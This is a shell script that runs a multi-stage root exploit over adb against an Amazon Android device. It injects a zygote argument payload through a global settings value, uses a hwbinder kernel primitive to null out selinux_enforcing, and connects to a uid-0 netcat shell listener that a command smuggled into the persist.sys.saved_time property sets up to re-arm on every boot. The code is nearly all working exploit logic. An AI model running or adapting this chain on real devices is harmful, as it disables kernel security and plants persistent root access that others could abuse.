#!/bin/sh
set -eu

# Reroot a fresh-booted PS7331.4460N in one host-side flow.
#
# Chain rebuilt on each boot (the selinux_enforcing NULL write is in-memory
# and reverts on reboot):
#  1. wait for boot_completed + the pre-armed time_update waiter
#  2. use the boot's single injection to start the v51 amazon_app JNI carrier
#  3. HWBINDER_STATEFUL        -> leak / EALREADY (0x40...)
#  4. HWBINDER_STATEFUL_WRITE  -> stage 0x51, sets selinux_enforcing = 0
#  5. verify getenforce == Permissive
#  6. wait for the already-running UID-0 time_update waiter to observe
#     Permissive, launch the payload, and restore persist.sys.saved_time
#  7. verify sentinel, restore saved_time, confirm clean exit state
#
# Safety: never leaves a crafted saved_time behind; never reboots; reverts
# nothing on the write side (Permissive is the intended goal for the boot).

repo_dir="$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
adb_bin="${ADB:-$repo_dir/tools/adb-portable.sh}"
# Git Bash (MSYS) rewrites leading-slash args for native binaries; adb's
# device-side paths (/data/..., /cache/...) must stay verbatim. The wrapper
# also sets it, but the exporting process must be the shell that forks adb.
MSYS_NO_PATHCONV=1
export MSYS_NO_PATHCONV
# Cross-version: the carrier host app (com.amazon.webview.chromium) and its
# uid are resolved at runtime: the uid is not guaranteed to be 10161 across
# firmware versions or factory data resets. SNUSNU_FORCE_CARRIER_UID
# overrides for testing.
carrier_host_pkg=com.amazon.webview.chromium
asset_dir="/data/user/0/$carrier_host_pkg/files/sn"
probe_port=43271
nice_name=codex-system-amazon-v52
payload_device="${1:-}"
waiter_trigger='x[$(until [ "$(getenforce)" ];do sleep 1;done;toybox nc -s 127.0.0.1 -p 4325 -L sh&)]000'
old_time_file=/data/local/tmp/__reroot_old_time
. "$repo_dir/scripts/carrier_abi.sh"
. "$repo_dir/scripts/phase_b_status.sh"

adb() { "$adb_bin" "$@"; }

fail_phase() {
  failure_code="$1"
  shift
  echo "SNU_PHASE_B_FAILURE=$(phase_b_failure_name "$failure_code")" >&2
  echo "FATAL: $*" >&2
  exit "$failure_code"
}
stage_hdr() { echo; echo "== $1 =="; }

carrier_uid="${SNUSNU_FORCE_CARRIER_UID:-}"
if [ -z "$carrier_uid" ]; then
  carrier_uid="$(adb shell pm list packages -U "$carrier_host_pkg" 2>&1 \
      | tr -d '\r' | sed -n 's/.*uid:\([0-9]*\).*/\1/p' | head -n1)"
fi
case "$carrier_uid" in
  ''|*[!0-9]*)
    fail_phase "$PHASE_B_PRECHECK" "cannot resolve uid of $carrier_host_pkg (pm list packages -U failed; is the app present?)"
    ;;
esac
# carrier_abi.sh validates the carrier identity against this uid
SNU_EXPECTED_CARRIER_UID="$carrier_uid"
export SNU_EXPECTED_CARRIER_UID
echo "carrier host: $carrier_host_pkg (uid $carrier_uid)"

if [ -n "$payload_device" ]; then
  [ -f "$payload_device" ] || fail_phase "$PHASE_B_PRECHECK" "payload file not found: $payload_device"
else
  echo "WARN: no payload supplied; chain will be built and stuck before the uid-0 run." >&2
fi

stage_hdr "1/7 boot state"
for i in $(seq 1 60); do
  boot="$(adb shell getprop sys.boot_completed 2>&1 | tr -d '\r')"
  [ "$boot" = 1 ] && break
  sleep 5
done
[ "$boot" = 1 ] || fail_phase "$PHASE_B_PRECHECK" "boot_completed never reached"
# PS7319: same settle as root_poc.sh - the zygote settings observer is not
# live at boot_completed+0 and the carrier injection would be silently lost.
settle="${SNUSNU_BOOT_SETTLE:-45}"
echo "settling ${settle}s before carrier injection"
sleep "$settle"

exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' 2>&1 | tr -d '\r')"
[ "$exempt" = null ] || [ -z "$exempt" ] || fail_phase "$PHASE_B_PRECHECK" "stale exemptions value present: $exempt"

saved_time="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
old_time="$(adb shell "cat $old_time_file" 2>&1 | tr -d '\r')"
case "$old_time" in
  ''|*[!0-9]*) fail_phase "$PHASE_B_WAITER_STATE" "unsafe saved_time restore value: $old_time" ;;
esac
# PS7319: the framework's boot time-sync overwrites persist.sys.saved_time
# ~60s into the boot, but the trigger has ALREADY fired by then: time_update
# is blocked inside the getenforce loop (init.svc.time_update stays
# "running"). So the armed-property check alone is wrong: the waiter being
# ALIVE is what matters. Accept either state.
time_svc="$(adb shell getprop init.svc.time_update 2>&1 | tr -d '\r')"
if [ "$saved_time" = "$waiter_trigger" ]; then
  echo "waiter=ARMED (property intact)"
elif [ "$time_svc" = "running" ]; then
  echo "waiter=FIRED-AND-WAITING (property normalized by time sync; time_update loop alive)"
else
  fail_phase "$PHASE_B_WAITER_STATE" "time_update waiter is not armed or running: saved_time=$saved_time svc=$time_svc"
fi
echo "boot=1 saved_time=$saved_time restore_value=$old_time exemptions=null"

if [ -n "$payload_device" ]; then
  # MSYS_NO_PATHCONV=1 (needed to keep adb's device paths verbatim) also
  # disables conversion of absolute MSYS local paths (/c/...), which the
  # native adb.exe cannot stat. Normalize the local path to a Windows-style
  # form before pushing.
  case "$payload_device" in
    /c/*) payload_device="C:${payload_device#/c}" ;;
    /d/*) payload_device="D:${payload_device#/d}" ;;
  esac
  push_ok=0
  for attempt in 1 2 3; do
    if adb push "$payload_device" /data/local/tmp/__reroot_payload.sh >/dev/null 2>&1; then
      push_ok=1
      break
    fi
    echo "payload push attempt $attempt failed; retrying in 10s"
    sleep 10
  done
  [ "$push_ok" = 1 ] || fail_phase "$PHASE_B_PRECHECK" "payload push failed"
  adb shell "chmod 0755 /data/local/tmp/__reroot_payload.sh" >/dev/null 2>&1 \
    || fail_phase "$PHASE_B_PRECHECK" "payload chmod failed"
fi

stage_hdr "boot-wiring precheck"
wiring="$(adb shell "logcat -d -v time 2>/dev/null | grep -icE 'no zygote connection|can.t set api blacklist|failed to set api blacklist'" 2>&1 | tr -d '\r')"
echo "wiring_failure_lines=$wiring"
# logcat persists across reboots, and our own injections legitimately log
# "Failed to set API blacklist exemptions" (the exemptions child re-dies after
# wrapper-exec), so this counter is noisy. Do not auto-reboot on it; the leak
# (stage 3) and injection (stage 6) retries already absorb transient failures.
[ "$wiring" = 0 ] || echo "WARN: wiring/noise lines present ($wiring); continuing anyway"

stage_hdr "2/7 carrier up on 127.0.0.1:$probe_port"
carrier_up() {
  [ "$(printf 'PING\n' | adb shell "toybox nc -w 3 127.0.0.1 $probe_port" 2>&1 | tr -d '\r')" = PONG ]
}
carrier_identity() {
  printf 'ID\n' | adb shell "toybox nc -w 3 127.0.0.1 $probe_port" 2>&1 | tr -d '\r'
}
carrier_start() {
  # The carrier runs as the webview app's own uid (runtime-resolved above)
  # so it can traverse /data/user/0/<pkg>/ (0700 app dir) and read the
  # staged assets. Upstream used uid 10100 with assets in the
  # world-traversable /data/securedStorageLocation; on PS7319 no staging
  # channel can write there, so the assets live in the webview app's own
  # data dir and the carrier must share that uid. The domain stays
  # amazon_app (seinfo=amazonapp): the upstream-proven carrier domain.
  payload='LClass1;->method1(
10
--runtime-args
--setuid='"$carrier_uid"'
--setgid='"$carrier_uid"'
--runtime-flags=2049
--mount-external-full
--setgroups=3003
--nice-name='"$nice_name"'
--seinfo=amazonapp:targetSdkVersion=22:complete
--invoke-with
/system/bin/sh '"$asset_dir"'/carrier_launcher.sh;
'
  {
    printf 'settings put global hidden_api_blacklist_exemptions "%s"\n' "$payload"
    printf 'settings delete global hidden_api_blacklist_exemptions\n'
  } | adb shell >/dev/null 2>&1

  for i in $(seq 1 20); do
    carrier_up && return 0
    sleep 1
  done
  return 1
}

if ! carrier_up; then
  echo "carrier absent -> spawn deterministic app_process64 carrier"
  # A lost settings-put does not consume the one-shot; retry the injection
  # with spacing (same early-boot observer race as the waiter arming).
  carrier_ok=0
  for attempt in 1 2 3 4 5; do
    if carrier_start; then
      carrier_ok=1
      break
    fi
    echo "carrier injection attempt $attempt not observed; waiting 30s before retry"
    sleep 30
  done
  [ "$carrier_ok" = 1 ] || fail_phase "$PHASE_B_CARRIER_START" "carrier start failed before hwbinder was attempted"
  echo "carrier respawned, PONG"
else
  echo "carrier already live"
fi
identity="$(carrier_identity)"
echo "carrier_identity=$identity"
if ! carrier_validate_identity "$identity" "$asset_dir"; then
  fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: $CARRIER_VALIDATION_ERROR"
fi
carrier_pid="$CARRIER_PID"
supported_abis="$(adb shell getprop ro.product.cpu.abilist 2>&1 | tr -d '\r')"
[ -n "$supported_abis" ] || supported_abis="$(adb shell getprop ro.product.cpu.abi | tr -d '\r')"
remote_elf_class() {
  # PS7319: the JNI lives in the webview app's data dir, which the shell
  # domain cannot read: this returns UNKNOWN by design. The carrier's own
  # ID report (elf=/jni=, validated in carrier_validate_identity) is the
  # authoritative check; this is only a cross-check when it happens to work.
  bytes="$(adb shell "toybox od -An -t u1 -N 5 '$1' 2>/dev/null" | tr -d '\r' | tr -s ' ' | sed 's/^ //')"
  case "$bytes" in
    "127 69 76 70 1") echo ELF32 ;;
    "127 69 76 70 2") echo ELF64 ;;
    *) echo UNKNOWN ;;
  esac
}
carrier_class="$CARRIER_ELF"
carrier_abi="$CARRIER_ABI"
selected_jni="$CARRIER_JNI"
native_path="$selected_jni"
native_class="$(remote_elf_class "$native_path")"
selected_class="$native_class"
echo "device_supported_abis=$supported_abis"
echo "carrier_pid=$carrier_pid carrier_uid_context=$identity"
echo "carrier_abi=$carrier_abi carrier_elf_class=$carrier_class"
echo "selected_jni_library=$selected_jni selected_elf_class=$selected_class"
echo "native_library=$native_path native_elf_class=$native_class"
if [ "$native_class" = UNKNOWN ]; then
  echo "note: shell-side ELF read unavailable (app_data_file); relying on the carrier's self-reported elf=$carrier_class jni=$selected_jni"
else
  [ "$selected_class" = "$carrier_class" ] \
    || fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: no compatible packaged JNI payload for PID $carrier_pid ($carrier_class)"
  [ "$native_class" = "$carrier_class" ] \
    || fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: selected JNI payload mismatch (carrier=$carrier_class native=$native_class selected=$selected_jni)"
fi
[ "$carrier_class" = ELF64 ] \
  || fail_phase "$PHASE_B_VALIDATION" "carrier validation failed: 32-bit Binder compat ABI cannot carry the primitive's 64-bit kernel pointers"

stage_hdr "3/7 stateful leak (boot-spent on ENODATA; reboot to retry)"
# Single shot on the fresh carrier. ENODATA (0x50+errno 61) means the
# replace-marker missed but binder nodes stay active in the kernel AND in the
# carrier process; a replacement cannot bind the occupied probe port, and
# shell (uid 2000) cannot kill the uid-10100 carrier, so
# EALREADY follows until the whole device reboots. Leak success is
# result=0x5000000000000000.
#
# CORRECTION (2026-10-07): the "respawn cannot clear ENODATA" claim below is
# false for the statically linked standalone carrier on trona. Measured: on a
# boot whose first attempt had already returned 0x5000003d00000000, re-running
# `snusnu_hwbinder_root stateful-root-hold` in the SAME boot succeeded on the
# next attempt and left SELinux Permissive. Stage 4 relies on this and retries
# in-boot instead of spending a reboot. Probe:
# stage4-persistent/inboot-retry-probe.sh; analysis: docs/ENODATA-ANALYSIS.md §12.
# This host-driven flow still reboots on a miss, which is correct for it -- the
# JNI carrier holds the probe port, so a second attempt cannot be injected.
run_leak() {
  # Patched carrier (10 ms waits, docs/ENODATA-ANALYSIS.md) answers in ~4-5 s;
  # 20 s leaves margin for the poll loops' worst case.
  adb shell "toybox nc -w 20 127.0.0.1 $probe_port" 2>&1 <<'EOF' | tr -d '\r'
HWBINDER_STATEFUL
EOF
}
leak="$(run_leak)"
echo "HWBINDER_STATEFUL $leak"
case "$leak" in
  *result=0x5000000000000000*)
    echo "leak confirmed: $leak"
    ;;
  *)
    echo "leak result not cleared (stateful leak failed). This boot's binder-node state is spent;"
    echo "NULL write requires a fresh kernel boot (in-boot carrier respawn cannot clear ENODATA/EALREADY)."
    echo "leak=$leak"
    fail_phase "$PHASE_B_STATEFUL_SPENT" "stateful leak failed on fresh carrier: $leak"
    ;;
esac

stage_hdr "4/7 write null to selinux_enforcing"
w1="$(printf 'HWBINDER_STATEFUL_WRITE\n' | adb shell "toybox nc -w 20 127.0.0.1 $probe_port" 2>&1 | tr -d '\r')"
echo "HWBINDER_STATEFUL_WRITE $w1"
case "$w1" in
  *result=0x51*) : ;;
  *) fail_phase "$PHASE_B_POST_WRITE" "unexpected write result: $w1" ;;
esac

stage_hdr "5/7 verify Permissive"
enforce="$(adb shell getenforce 2>&1 | tr -d '\r')"
echo "getenforce=$enforce"
[ "$enforce" = Permissive ] || fail_phase "$PHASE_B_POST_WRITE" "SELinux still enforcing after write"

if [ -z "$payload_device" ]; then
  echo "no payload given; chain built and Permissive verified. exiting clean."
  exit 0
fi

stage_hdr "6/7 wait for pre-armed uid-0 time_update handoff"
# PS7319: the inline trigger's nc listener on 4325 IS the root service
# (uid 0, u:r:time_update:s0). It starts the moment Permissive lands.
root_reply=""
for i in $(seq 1 60); do
  root_reply="$(printf 'id -u\ncat /proc/self/attr/current\nexit\n' \
    | adb shell 'toybox nc -w 2 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
  case "$root_reply" in
    0*u:r:time_update:s0*) break ;;
  esac
  sleep 1
done
echo "root_service=$root_reply"
case "$root_reply" in
  0*u:r:time_update:s0*) : ;;
  *) fail_phase "$PHASE_B_WAITER_STATE" "pre-armed time_update payload did not create the root service after successful Binder write" ;;
esac
adb logcat -d -s REROOTWAIT:I REROOT:I ROOTSVC:I '*:S' || true
echo "saved_time_now=$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
echo "time_update_svc=$(adb shell getprop init.svc.time_update | tr -d '\r')"

stage_hdr "7/7 exit-state guard"
# Restore proved impossible in-boot: time_update lacks property_socket write
# (avc denied, permissive=1) and run-as requires a debuggable package. The
# persist-armed waiter re-installs the uid-0 listener on every boot, which is
# the desired end state. Accept either numeric (restored) or still-armed.
restored="$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
echo "saved_time_state=$restored"
case "$restored" in
  "$old_time")
    echo "saved_time numeric == original -> persistence disabled cleanly (disarmed)" ;;
  x*)
    echo "saved_time still armed -> persistent-root waiter re-fires every boot" ;;
  ''|*[!0-9]*)
    fail_phase "$PHASE_B_POST_WRITE" "unexpected saved_time state: $restored" ;;
  *)
    echo "saved_time numeric but != original ($old_time) -> time_update rewrote it; persistence disarmed (safe)" ;;
esac

exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' | tr -d '\r')"
echo "exemptions=$exempt"
[ "$exempt" = null ] || fail_phase "$PHASE_B_POST_WRITE" "exemptions left set"

echo "enforce=$(adb shell getenforce | tr -d '\r')"
echo "OK reroot flow complete"
